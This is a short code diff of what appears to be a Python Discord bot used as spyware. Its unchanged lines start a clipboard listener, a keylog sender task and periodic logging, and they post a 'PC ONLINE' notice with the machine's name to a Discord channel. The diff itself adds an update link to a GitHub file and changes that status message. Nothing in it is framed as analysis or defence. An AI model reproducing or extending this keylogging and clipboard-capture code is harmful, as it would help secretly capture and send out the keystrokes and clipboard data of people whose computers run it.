@@ -1,3 +1,5 @@
+## UPDATE ONLINE GITHUB : https://github.com/robloxonly981-gif/mYcDeyacjs/blob/main/bot.py
+
 import discord
 from discord.ext import commands, tasks
 import psutil, platform, datetime, asyncio, io, json, socket, os, sys, re, ctypes
@@ -591,7 +593,7 @@ async def on_ready():
     threading.Thread(target=clipboard_listener, daemon=True).start()
     
     channel = bot.get_channel(CHANNEL_ID)
-    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.", color=discord.Color.green()))
+    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.UPDATE DONE", color=discord.Color.green()))
     
     if not periodic_log.is_running(): periodic_log.start()
     if not keylog_sender_task.is_running(): keylog_sender_task.start()
